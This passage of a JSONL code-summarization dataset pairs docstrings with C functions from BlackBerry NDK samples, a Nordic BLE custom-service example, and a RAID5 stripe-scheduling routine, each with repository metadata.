NAVIGATOR_EXIT event then set the exit_application\n             * flag so the application will stop processing events, clean up\n             * and exit\n             */\n            if (bps_event_get_domain(event) == navigator_get_domain()) {\n                if (NAVIGATOR_EXIT == bps_event_get_code(event)) {\n                    exit_application = 1;\n                }\n            }\n        }\n    }\n\n    /*\n     * Destroy the dialog, if it exists and cleanup screen resources.\n     */\n    destroy_dialog();\n    cleanup_screen();\n\n    /*\n     * Clean up the BPS infrastructure and exit\n     */\n    bps_shutdown();\n    return 0;\n}", "path": "NetworkStatus\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Show an alert dialog that has two buttons: a \"Cancel\" button, and a \"OK\" button.\n */\n", "func_signal": "static void\nshow_alert()", "code": "{\n    if (alert_dialog) {\n        return;\n    }\n\n    if (dialog_create_alert(&alert_dialog) != BPS_SUCCESS) {\n        fprintf(stderr, \"Failed to create alert dialog.\");\n        return;\n    }\n\n    if (dialog_set_alert_message_text(alert_dialog, \"Hello World!\") != BPS_SUCCESS) {\n        fprintf(stderr, \"Failed to set alert dialog message text.\");\n        dialog_destroy(alert_dialog);\n        alert_dialog = 0;\n        return;\n    }\n\n    /*\n     * Create a context to attach to the cancel button\n     */\n    char* cancel_button_context = \"Cancelled\";\n\n    /*\n     * Use a button label defined in bps/dialog.h. Attach a context to the button.\n     */\n    if (dialog_add_button(alert_dialog, DIALOG_CANCEL_LABEL, true, cancel_button_context, true) != BPS_SUCCESS) {\n        fprintf(stderr, \"Failed to add button to alert dialog.\");\n        dialog_destroy(alert_dialog);\n        alert_dialog = 0;\n        return;\n    }\n\n    /*\n     * Use a button label of our own. Don't attach a context to the button.\n     */\n    if (dialog_add_button(alert_dialog, DIALOG_OK_LABEL, true, 0, true) != BPS_SUCCESS) {\n        fprintf(stderr, \"Failed to add button to alert dialog.\");\n        dialog_destroy(alert_dialog);\n        alert_dialog = 0;\n        return;\n    }\n\n    if (dialog_show(alert_dialog) != BPS_SUCCESS) {\n        fprintf(stderr, \"Failed to show alert dialog.\");\n        dialog_destroy(alert_dialog);\n        alert_dialog = 0;\n        return;\n    }\n}", "path": "Dialog\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Handle a dialog response.\n */\n", "func_signal": "static void\nhandle_dialog_response(bps_event_t *event)", "code": "{\n    /*\n     * Double check that the event is valid\n     */\n    if (event == NULL) {\n        return;\n    }\n\n    int selectedIndex = dialog_event_get_selected_index(event);\n    const char* label = dialog_event_get_selected_label(event);\n    const char* context = dialog_event_get_selected_context(event);\n\n    char output[1024];\n    snprintf(output, 1024, \"Selected Index: %d, Label: %s, Context: %s\\n\",\n            selectedIndex, label?label:\"n/a\", context?(char*)context:\"n/a\");\n    fprintf(stderr, output);\n\n    dialog_destroy(alert_dialog);\n    alert_dialog = 0;\n}", "path": "Dialog\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Convert a heading in degrees to a bearing.\n */\n", "func_signal": "static const char *\nget_bearing(double heading)", "code": "{\n    static const char * cardinals[] = {\n        \"N\", \"NE\",\n        \"E\", \"SE\",\n        \"S\", \"SW\",\n        \"W\", \"NW\",\n    };\n    static const int num_cardinals = 8;\n\n    double adjusted_heading = heading + (360.0/num_cardinals/2);\n    int index = (int)(adjusted_heading / 360.0 * num_cardinals) % num_cardinals;\n\n    return cardinals[index];\n}", "path": "Geolocation\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/* Finds the next power of 2 */\n", "func_signal": "static inline int\nnextp2(int x)", "code": "{\n    int val = 1;\n    while(val < x) val <<= 1;\n    return val;\n}", "path": "Gamepad\\bbutil.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Print the network status.\n *\n * @param is_available boolean indicating the networks status to be displayed\n * with true being network available and false network unavailable.\n */\n", "func_signal": "void\ndisplay_net_status(bool is_available)", "code": "{\n    /*\n     * Print the network status\n     */\n    if(is_available) {\n        show_dialog_message(\"Network: Available\");\n    } else {\n        show_dialog_message(\"Network: Unavailable\");\n    }\n}", "path": "NetworkStatus\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Use the PID to set the window group id.\n */\n", "func_signal": "static const char *\nget_window_group_id()", "code": "{\n    static char s_window_group_id[16] = \"\";\n\n    if (s_window_group_id[0] == '\\0') {\n        snprintf(s_window_group_id, sizeof(s_window_group_id), \"%d\", getpid());\n    }\n\n    return s_window_group_id;\n}", "path": "Dialog\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**\n * Set up a basic screen, so that the navigator will\n * send window state events when the window state changes.\n *\n * @return @c EXIT_SUCCESS or @c EXIT_FAILURE\n */\n", "func_signal": "int\nsetup_screen()", "code": "{\n    if (screen_create_context(&screen_ctx, SCREEN_APPLICATION_CONTEXT) != 0) {\n        return EXIT_FAILURE;\n    }\n\n    if (screen_create_window(&screen_win, screen_ctx) != 0) {\n        screen_destroy_context(screen_ctx);\n        return EXIT_FAILURE;\n    }\n\n    if (screen_create_window_group(screen_win, get_window_group_id()) != 0) goto fail;\n\n    int usage = SCREEN_USAGE_NATIVE;\n    if (screen_set_window_property_iv(screen_win, SCREEN_PROPERTY_USAGE, &usage) != 0) goto fail;\n\n    if (screen_create_window_buffers(screen_win, 1) != 0) goto fail;\n\n    screen_buffer_t buff;\n    if (screen_get_window_property_pv(screen_win, SCREEN_PROPERTY_RENDER_BUFFERS, (void*)&buff) != 0) goto fail;\n\n    int buffer_size[2];\n    if (screen_get_buffer_property_iv(buff, SCREEN_PROPERTY_BUFFER_SIZE, buffer_size) != 0) goto fail;\n\n    int attribs[1] = {SCREEN_BLIT_END};\n    if (screen_fill(screen_ctx, buff, attribs) != 0) goto fail;\n\n    int dirty_rects[4] = {0, 0, buffer_size[0], buffer_size[1]};\n    if (screen_post_window(screen_win, buff, 1, (const int*)dirty_rects, 0) != 0) goto fail;\n\n    return EXIT_SUCCESS;\n\nfail:\n    screen_destroy_window(screen_win);\n    screen_destroy_context(screen_ctx);\n    return EXIT_FAILURE;\n}", "path": "Dialog\\main.c", "repo_name": "blackberry/NDK-Samples", "stars": 153, "license": "None", "language": "c", "size": 44517}
{"docstring": "/**@brief Function for handling the Connect event.\n *\n * @param[in]   p_cus       Custom Service structure.\n * @param[in]   p_ble_evt   Event received from the BLE stack.\n */\n", "func_signal": "static void on_connect(ble_cus_t * p_cus, ble_evt_t const * p_ble_evt)", "code": "{\n    p_cus->conn_handle = p_ble_evt->evt.gap_evt.conn_handle;\n\n    ble_cus_evt_t evt;\n\n    evt.evt_type = BLE_CUS_EVT_CONNECTED;\n\n    p_cus->evt_handler(p_cus, &evt);\n}", "path": "ble_cus.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for the GAP initialization.\n *\n * @details This function sets up all the necessary GAP (Generic Access Profile) parameters of the\n *          device including the device name, appearance, and the preferred connection parameters.\n */\n", "func_signal": "static void gap_params_init(void)", "code": "{\n    ret_code_t              err_code;\n    ble_gap_conn_params_t   gap_conn_params;\n    ble_gap_conn_sec_mode_t sec_mode;\n\n    BLE_GAP_CONN_SEC_MODE_SET_OPEN(&sec_mode);\n\n    err_code = sd_ble_gap_device_name_set(&sec_mode,\n                                          (const uint8_t *)DEVICE_NAME,\n                                          strlen(DEVICE_NAME));\n    APP_ERROR_CHECK(err_code);\n\n    /* YOUR_JOB: Use an appearance value matching the application's use case.\n       err_code = sd_ble_gap_appearance_set(BLE_APPEARANCE_);\n       APP_ERROR_CHECK(err_code); */\n\n    memset(&gap_conn_params, 0, sizeof(gap_conn_params));\n\n    gap_conn_params.min_conn_interval = MIN_CONN_INTERVAL;\n    gap_conn_params.max_conn_interval = MAX_CONN_INTERVAL;\n    gap_conn_params.slave_latency     = SLAVE_LATENCY;\n    gap_conn_params.conn_sup_timeout  = CONN_SUP_TIMEOUT;\n\n    err_code = sd_ble_gap_ppcp_set(&gap_conn_params);\n    APP_ERROR_CHECK(err_code);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing services that will be used by the application.\n */\n", "func_signal": "static void services_init(void)", "code": "{\n        ret_code_t          err_code;\n        nrf_ble_qwr_init_t  qwr_init = {0};\n        ble_cus_init_t      cus_init = {0};\n\n        // Initialize Queued Write Module.\n        qwr_init.error_handler = nrf_qwr_error_handler;\n\n        err_code = nrf_ble_qwr_init(&m_qwr, &qwr_init);\n        APP_ERROR_CHECK(err_code);\n\n         // Initialize CUS Service init structure to zero.\n        cus_init.evt_handler                = on_cus_evt;\n    \n        BLE_GAP_CONN_SEC_MODE_SET_OPEN(&cus_init.custom_value_char_attr_md.cccd_write_perm);\n        BLE_GAP_CONN_SEC_MODE_SET_OPEN(&cus_init.custom_value_char_attr_md.read_perm);\n        BLE_GAP_CONN_SEC_MODE_SET_OPEN(&cus_init.custom_value_char_attr_md.write_perm);\n    \n        err_code = ble_cus_init(&m_cus, &cus_init);\n        APP_ERROR_CHECK(err_code);\n                \n    /* YOUR_JOB: Add code to initialize the services used by the application.\n       ble_xxs_init_t                     xxs_init;\n       ble_yys_init_t                     yys_init;\n\n       // Initialize XXX Service.\n       memset(&xxs_init, 0, sizeof(xxs_init));\n\n       xxs_init.evt_handler                = NULL;\n       xxs_init.is_xxx_notify_supported    = true;\n       xxs_init.ble_xx_initial_value.level = 100;\n\n       err_code = ble_bas_init(&m_xxs, &xxs_init);\n       APP_ERROR_CHECK(err_code);\n\n       // Initialize YYY Service.\n       memset(&yys_init, 0, sizeof(yys_init));\n       yys_init.evt_handler                  = on_yys_evt;\n       yys_init.ble_yy_initial_value.counter = 0;\n\n       err_code = ble_yy_service_init(&yys_init, &yy_init);\n       APP_ERROR_CHECK(err_code);\n     */\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing the BLE stack.\n *\n * @details Initializes the SoftDevice and the BLE event interrupt.\n */\n", "func_signal": "static void ble_stack_init(void)", "code": "{\n    ret_code_t err_code;\n\n    err_code = nrf_sdh_enable_request();\n    APP_ERROR_CHECK(err_code);\n\n    // Configure the BLE stack using the default settings.\n    // Fetch the start address of the application RAM.\n    uint32_t ram_start = 0;\n    err_code = nrf_sdh_ble_default_cfg_set(APP_BLE_CONN_CFG_TAG, &ram_start);\n    APP_ERROR_CHECK(err_code);\n\n    // Enable BLE stack.\n    err_code = nrf_sdh_ble_enable(&ram_start);\n    APP_ERROR_CHECK(err_code);\n\n    // Register a handler for BLE events.\n    NRF_SDH_BLE_OBSERVER(m_ble_observer, APP_BLE_OBSERVER_PRIO, ble_evt_handler, NULL);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing buttons and leds.\n *\n * @param[out] p_erase_bonds  Will be true if the clear bonding button was pressed to wake the application up.\n */\n", "func_signal": "static void buttons_leds_init(bool * p_erase_bonds)", "code": "{\n    ret_code_t err_code;\n    bsp_event_t startup_event;\n\n    err_code = bsp_init(BSP_INIT_LEDS | BSP_INIT_BUTTONS, bsp_event_handler);\n    APP_ERROR_CHECK(err_code);\n\n    err_code = bsp_btn_ble_init(NULL, &startup_event);\n    APP_ERROR_CHECK(err_code);\n\n    *p_erase_bonds = (startup_event == BSP_EVENT_CLEAR_BONDING_DATA);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing the Connection Parameters module.\n */\n", "func_signal": "static void conn_params_init(void)", "code": "{\n    ret_code_t             err_code;\n    ble_conn_params_init_t cp_init;\n\n    memset(&cp_init, 0, sizeof(cp_init));\n\n    cp_init.p_conn_params                  = NULL;\n    cp_init.first_conn_params_update_delay = FIRST_CONN_PARAMS_UPDATE_DELAY;\n    cp_init.next_conn_params_update_delay  = NEXT_CONN_PARAMS_UPDATE_DELAY;\n    cp_init.max_conn_params_update_count   = MAX_CONN_PARAMS_UPDATE_COUNT;\n    cp_init.start_on_notify_cccd_handle    = BLE_GATT_HANDLE_INVALID;\n    cp_init.disconnect_on_fail             = false;\n    cp_init.evt_handler                    = on_conn_params_evt;\n    cp_init.error_handler                  = conn_params_error_handler;\n\n    err_code = ble_conn_params_init(&cp_init);\n    APP_ERROR_CHECK(err_code);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for putting the chip into sleep mode.\n *\n * @note This function will not return.\n */\n", "func_signal": "static void sleep_mode_enter(void)", "code": "{\n    ret_code_t err_code;\n\n    err_code = bsp_indication_set(BSP_INDICATE_IDLE);\n    APP_ERROR_CHECK(err_code);\n\n    // Prepare wakeup buttons.\n    err_code = bsp_btn_ble_sleep_mode_prepare();\n    APP_ERROR_CHECK(err_code);\n\n    // Go to system-off mode (this function will not return; wakeup will cause a reset).\n    err_code = sd_power_system_off();\n    APP_ERROR_CHECK(err_code);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing the Advertising functionality.\n */\n", "func_signal": "static void advertising_init(void)", "code": "{\n    ret_code_t             err_code;\n    ble_advertising_init_t init;\n\n    memset(&init, 0, sizeof(init));\n\n    init.advdata.name_type               = BLE_ADVDATA_FULL_NAME;\n    init.advdata.include_appearance      = true;\n    init.advdata.flags                   = BLE_GAP_ADV_FLAGS_LE_ONLY_GENERAL_DISC_MODE;\n    init.advdata.uuids_complete.uuid_cnt = sizeof(m_adv_uuids) / sizeof(m_adv_uuids[0]);\n    init.advdata.uuids_complete.p_uuids  = m_adv_uuids;\n\n    init.config.ble_adv_fast_enabled  = true;\n    init.config.ble_adv_fast_interval = APP_ADV_INTERVAL;\n    init.config.ble_adv_fast_timeout  = APP_ADV_DURATION;\n\n    init.evt_handler = on_adv_evt;\n\n    err_code = ble_advertising_init(&m_advertising, &init);\n    APP_ERROR_CHECK(err_code);\n\n    ble_advertising_conn_cfg_tag_set(&m_advertising, APP_BLE_CONN_CFG_TAG);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for handling events from the BSP module.\n *\n * @param[in]   event   Event generated when button is pressed.\n */\n", "func_signal": "static void bsp_event_handler(bsp_event_t event)", "code": "{\n    ret_code_t err_code;\n\n    switch (event)\n    {\n        case BSP_EVENT_SLEEP:\n            sleep_mode_enter();\n            break; // BSP_EVENT_SLEEP\n\n        case BSP_EVENT_DISCONNECT:\n            err_code = sd_ble_gap_disconnect(m_conn_handle,\n                                             BLE_HCI_REMOTE_USER_TERMINATED_CONNECTION);\n            if (err_code != NRF_ERROR_INVALID_STATE)\n            {\n                APP_ERROR_CHECK(err_code);\n            }\n            break; // BSP_EVENT_DISCONNECT\n\n        case BSP_EVENT_WHITELIST_OFF:\n            if (m_conn_handle == BLE_CONN_HANDLE_INVALID)\n            {\n                err_code = ble_advertising_restart_without_whitelist(&m_advertising);\n                if (err_code != NRF_ERROR_INVALID_STATE)\n                {\n                    APP_ERROR_CHECK(err_code);\n                }\n            }\n            break; // BSP_EVENT_KEY_0\n\n        default:\n            break;\n    }\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for handling advertising events.\n *\n * @details This function will be called for advertising events which are passed to the application.\n *\n * @param[in] ble_adv_evt  Advertising event.\n */\n", "func_signal": "static void on_adv_evt(ble_adv_evt_t ble_adv_evt)", "code": "{\n    ret_code_t err_code;\n\n    switch (ble_adv_evt)\n    {\n        case BLE_ADV_EVT_FAST:\n            NRF_LOG_INFO(\"Fast advertising.\");\n            err_code = bsp_indication_set(BSP_INDICATE_ADVERTISING);\n            APP_ERROR_CHECK(err_code);\n            break;\n\n        case BLE_ADV_EVT_IDLE:\n            sleep_mode_enter();\n            break;\n\n        default:\n            break;\n    }\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing the GATT module.\n */\n", "func_signal": "static void gatt_init(void)", "code": "{\n    ret_code_t err_code = nrf_ble_gatt_init(&m_gatt, NULL);\n    APP_ERROR_CHECK(err_code);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for handling the Write event.\n *\n * @param[in]   p_cus       Custom Service structure.\n * @param[in]   p_ble_evt   Event received from the BLE stack.\n */\n", "func_signal": "static void on_write(ble_cus_t * p_cus, ble_evt_t const * p_ble_evt)", "code": "{\n    ble_gatts_evt_write_t const * p_evt_write = &p_ble_evt->evt.gatts_evt.params.write;\n    \n    // Custom Value Characteristic Written to.\n    if (p_evt_write->handle == p_cus->custom_value_handles.value_handle)\n    {\n        nrf_gpio_pin_toggle(LED_4);\n        /*\n        if(*p_evt_write->data == 0x01)\n        {\n            nrf_gpio_pin_clear(20); \n        }\n        else if(*p_evt_write->data == 0x02)\n        {\n            nrf_gpio_pin_set(20); \n        }\n        else\n        {\n          //Do nothing\n        }\n        */\n    }\n\n    // Check if the Custom value CCCD is written to and that the value is the appropriate length, i.e 2 bytes.\n    if ((p_evt_write->handle == p_cus->custom_value_handles.cccd_handle)\n        && (p_evt_write->len == 2)\n       )\n    {\n        // CCCD written, call application event handler\n        if (p_cus->evt_handler != NULL)\n        {\n            ble_cus_evt_t evt;\n\n            if (ble_srv_is_notification_enabled(p_evt_write->data))\n            {\n                evt.evt_type = BLE_CUS_EVT_NOTIFICATION_ENABLED;\n            }\n            else\n            {\n                evt.evt_type = BLE_CUS_EVT_NOTIFICATION_DISABLED;\n            }\n            // Call the application event handler.\n            p_cus->evt_handler(p_cus, &evt);\n        }\n    }\n\n}", "path": "ble_cus.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for handling Peer Manager events.\n *\n * @param[in] p_evt  Peer Manager event.\n */\n", "func_signal": "static void pm_evt_handler(pm_evt_t const * p_evt)", "code": "{\n    ret_code_t err_code;\n\n    switch (p_evt->evt_id)\n    {\n        case PM_EVT_BONDED_PEER_CONNECTED:\n        {\n            NRF_LOG_INFO(\"Connected to a previously bonded device.\");\n        } break;\n\n        case PM_EVT_CONN_SEC_SUCCEEDED:\n        {\n            NRF_LOG_INFO(\"Connection secured: role: %d, conn_handle: 0x%x, procedure: %d.\",\n                         ble_conn_state_role(p_evt->conn_handle),\n                         p_evt->conn_handle,\n                         p_evt->params.conn_sec_succeeded.procedure);\n        } break;\n\n        case PM_EVT_CONN_SEC_FAILED:\n        {\n            /* Often, when securing fails, it shouldn't be restarted, for security reasons.\n             * Other times, it can be restarted directly.\n             * Sometimes it can be restarted, but only after changing some Security Parameters.\n             * Sometimes, it cannot be restarted until the link is disconnected and reconnected.\n             * Sometimes it is impossible, to secure the link, or the peer device does not support it.\n             * How to handle this error is highly application dependent. */\n        } break;\n\n        case PM_EVT_CONN_SEC_CONFIG_REQ:\n        {\n            // Reject pairing request from an already bonded peer.\n            pm_conn_sec_config_t conn_sec_config = {.allow_repairing = false};\n            pm_conn_sec_config_reply(p_evt->conn_handle, &conn_sec_config);\n        } break;\n\n        case PM_EVT_STORAGE_FULL:\n        {\n            // Run garbage collection on the flash.\n            err_code = fds_gc();\n            if (err_code == FDS_ERR_NO_SPACE_IN_QUEUES)\n            {\n                // Retry.\n            }\n            else\n            {\n                APP_ERROR_CHECK(err_code);\n            }\n        } break;\n\n        case PM_EVT_PEERS_DELETE_SUCCEEDED:\n        {\n            advertising_start(false);\n        } break;\n\n        case PM_EVT_PEER_DATA_UPDATE_FAILED:\n        {\n            // Assert.\n            APP_ERROR_CHECK(p_evt->params.peer_data_update_failed.error);\n        } break;\n\n        case PM_EVT_PEER_DELETE_FAILED:\n        {\n            // Assert.\n            APP_ERROR_CHECK(p_evt->params.peer_delete_failed.error);\n        } break;\n\n        case PM_EVT_PEERS_DELETE_FAILED:\n        {\n            // Assert.\n            APP_ERROR_CHECK(p_evt->params.peers_delete_failed_evt.error);\n        } break;\n\n        case PM_EVT_ERROR_UNEXPECTED:\n        {\n            // Assert.\n            APP_ERROR_CHECK(p_evt->params.error_unexpected.error);\n        } break;\n\n        case PM_EVT_CONN_SEC_START:\n        case PM_EVT_PEER_DATA_UPDATE_SUCCEEDED:\n        case PM_EVT_PEER_DELETE_SUCCEEDED:\n        case PM_EVT_LOCAL_DB_CACHE_APPLIED:\n        case PM_EVT_LOCAL_DB_CACHE_APPLY_FAILED:\n            // This can happen when the local DB has changed.\n        case PM_EVT_SERVICE_CHANGED_IND_SENT:\n        case PM_EVT_SERVICE_CHANGED_IND_CONFIRMED:\n        default:\n            break;\n    }\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for application main entry.\n */\n", "func_signal": "int main(void)", "code": "{\n    bool erase_bonds;\n\n    // Initialize.\n    log_init();\n    timers_init();\n    buttons_leds_init(&erase_bonds);\n    power_management_init();\n    ble_stack_init();\n    gap_params_init();\n    gatt_init();\n    services_init();\n    advertising_init();\n    conn_params_init();\n    peer_manager_init();\n\n    // Start execution.\n    NRF_LOG_INFO(\"Template example started.\");\n    application_timers_start();\n\n    advertising_start(erase_bonds);\n\n    // Enter main loop.\n    for (;;)\n    {\n        idle_state_handle();\n    }\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for handling the Disconnect event.\n *\n * @param[in]   p_cus       Custom Service structure.\n * @param[in]   p_ble_evt   Event received from the BLE stack.\n */\n", "func_signal": "static void on_disconnect(ble_cus_t * p_cus, ble_evt_t const * p_ble_evt)", "code": "{\n    UNUSED_PARAMETER(p_ble_evt);\n    p_cus->conn_handle = BLE_CONN_HANDLE_INVALID;\n    \n    ble_cus_evt_t evt;\n\n    evt.evt_type = BLE_CUS_EVT_DISCONNECTED;\n\n    p_cus->evt_handler(p_cus, &evt);\n}", "path": "ble_cus.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Clear bond information from persistent storage.\n */\n", "func_signal": "static void delete_bonds(void)", "code": "{\n    ret_code_t err_code;\n\n    NRF_LOG_INFO(\"Erase bonds!\");\n\n    err_code = pm_peers_delete();\n    APP_ERROR_CHECK(err_code);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for handling the Connection Parameters Module.\n *\n * @details This function will be called for all events in the Connection Parameters Module which\n *          are passed to the application.\n *          @note All this function does is to disconnect. This could have been done by simply\n *                setting the disconnect_on_fail config parameter, but instead we use the event\n *                handler mechanism to demonstrate its use.\n *\n * @param[in] p_evt  Event received from the Connection Parameters Module.\n */\n", "func_signal": "static void on_conn_params_evt(ble_conn_params_evt_t * p_evt)", "code": "{\n    ret_code_t err_code;\n\n    if (p_evt->evt_type == BLE_CONN_PARAMS_EVT_FAILED)\n    {\n        err_code = sd_ble_gap_disconnect(m_conn_handle, BLE_HCI_CONN_INTERVAL_UNACCEPTABLE);\n        APP_ERROR_CHECK(err_code);\n    }\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing power management.\n */\n", "func_signal": "static void power_management_init(void)", "code": "{\n    ret_code_t err_code;\n    err_code = nrf_pwr_mgmt_init();\n    APP_ERROR_CHECK(err_code);\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for adding the Custom Value characteristic.\n *\n * @param[in]   p_cus        Battery Service structure.\n * @param[in]   p_cus_init   Information needed to initialize the service.\n *\n * @return      NRF_SUCCESS on success, otherwise an error code.\n */\n", "func_signal": "static uint32_t custom_value_char_add(ble_cus_t * p_cus, const ble_cus_init_t * p_cus_init)", "code": "{\n    uint32_t            err_code;\n    ble_gatts_char_md_t char_md;\n    ble_gatts_attr_md_t cccd_md;\n    ble_gatts_attr_t    attr_char_value;\n    ble_uuid_t          ble_uuid;\n    ble_gatts_attr_md_t attr_md;\n\n    // Add Custom Value characteristic\n    memset(&cccd_md, 0, sizeof(cccd_md));\n\n    //  Read  operation on cccd should be possible without authentication.\n    BLE_GAP_CONN_SEC_MODE_SET_OPEN(&cccd_md.read_perm);\n    BLE_GAP_CONN_SEC_MODE_SET_OPEN(&cccd_md.write_perm);\n    \n    cccd_md.write_perm = p_cus_init->custom_value_char_attr_md.cccd_write_perm;\n    cccd_md.vloc       = BLE_GATTS_VLOC_STACK;\n\n    memset(&char_md, 0, sizeof(char_md));\n\n    char_md.char_props.read   = 1;\n    char_md.char_props.write  = 1;\n    char_md.char_props.notify = 1; \n    char_md.p_char_user_desc  = NULL;\n    char_md.p_char_pf         = NULL;\n    char_md.p_user_desc_md    = NULL;\n    char_md.p_cccd_md         = &cccd_md; \n    char_md.p_sccd_md         = NULL;\n\t\t\n    ble_uuid.type = p_cus->uuid_type;\n    ble_uuid.uuid = CUSTOM_VALUE_CHAR_UUID;\n\n    memset(&attr_md, 0, sizeof(attr_md));\n\n    attr_md.read_perm  = p_cus_init->custom_value_char_attr_md.read_perm;\n    attr_md.write_perm = p_cus_init->custom_value_char_attr_md.write_perm;\n    attr_md.vloc       = BLE_GATTS_VLOC_STACK;\n    attr_md.rd_auth    = 0;\n    attr_md.wr_auth    = 0;\n    attr_md.vlen       = 0;\n\n    memset(&attr_char_value, 0, sizeof(attr_char_value));\n\n    attr_char_value.p_uuid    = &ble_uuid;\n    attr_char_value.p_attr_md = &attr_md;\n    attr_char_value.init_len  = sizeof(uint8_t);\n    attr_char_value.init_offs = 0;\n    attr_char_value.max_len   = sizeof(uint8_t);\n\n    err_code = sd_ble_gatts_characteristic_add(p_cus->service_handle, &char_md,\n                                               &attr_char_value,\n                                               &p_cus->custom_value_handles);\n    if (err_code != NRF_SUCCESS)\n    {\n        return err_code;\n    }\n\n    return NRF_SUCCESS;\n}", "path": "ble_cus.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/**@brief Function for initializing the nrf log module.\n */\n", "func_signal": "static void log_init(void)", "code": "{\n    ret_code_t err_code = NRF_LOG_INIT(NULL);\n    APP_ERROR_CHECK(err_code);\n\n    NRF_LOG_DEFAULT_BACKENDS_INIT();\n}", "path": "main.c", "repo_name": "bjornspockeli/custom_ble_service_example", "stars": 128, "license": "None", "language": "c", "size": 51246}
{"docstring": "/* __get_priority_stripe - get the next stripe to process\n *\n * Full stripe writes are allowed to pass preread active stripes up until\n * the bypass_threshold is exceeded.  In general the bypass_count\n * increments when the handle_list is handled before the hold_list; however, it\n * will not be incremented when STRIPE_IO_STARTED is sampled set signifying a\n * stripe with in flight i/o.  The bypass_count will be reset when the\n * head of the hold_list has changed, i.e. the head was promoted to the\n * handle_list.\n */\n", "func_signal": "static struct stripe_head *__get_priority_stripe(raid5_conf_t *conf)", "code": "{\n\tstruct stripe_head *sh;\n\n\tpr_debug(\"%s: handle: %s hold: %s full_writes: %d bypass_count: %d\\n\",\n\t\t  __func__,\n\t\t  list_empty(&conf->handle_list) ? \"empty\" : \"busy\",\n\t\t  list_empty(&conf->hold_list) ? \"empty\" : \"busy\",\n\t\t  atomic_read(&conf->pending_full_writes), conf->bypass_count);\n\n\tif (!list_empty(&conf->handle_list)) {\n\t\tsh = list_entry(conf->handle_list.next, typeof(*sh), lru);\n\n\t\tif (list_empty(&conf->hold_list))\n\t\t\tconf->bypass_count = 0;\n\t\telse if (!test_bit(STRIPE_IO_STARTED, &sh->state)) {\n\t\t\tif (conf->hold_list.next == conf->last_hold)\n\t\t\t\tconf->bypass_count++;\n\t\t\telse {\n\t\t\t\tconf->last_hold = conf->hold_list.next;\n\t\t\t\tconf->bypass_count -= conf->bypass_threshold;\n\t\t\t\tif (conf->bypass_count < 0)\n\t\t\t\t\tconf->bypass_count = 0;\n\t\t\t}\n\t\t}\n\t} else if (!list_empty(&conf->hold_list) &&\n\t\t   ((conf->bypass_threshold &&\n\t\t     conf->bypass_count > conf->bypass_threshold) ||\n\t\t    atomic_read(&conf->pending_full_writes) == 0)) {\n\t\tsh = list_entry(conf->hold_list.next,\n\t\t\t\ttypeof(*sh), lru);\n\t\tconf->bypass_count -= conf->bypass_threshold;\n\t\tif (conf->bypass_count < 0)\n\t\t\tconf->bypass_count = 0;\n\t} else\n\t\treturn NULL;\n\n\tlist_del_init(&sh->lru);\n\tatomic_inc(&sh->count);\n\tBUG_ON(atomic_read(&sh->count) != 1);\n\treturn sh;\n}", "path": "services\\raid6\\raid456\\39\\raid5.c", "repo_name": "wbsun/kgpu", "stars": 210, "license": 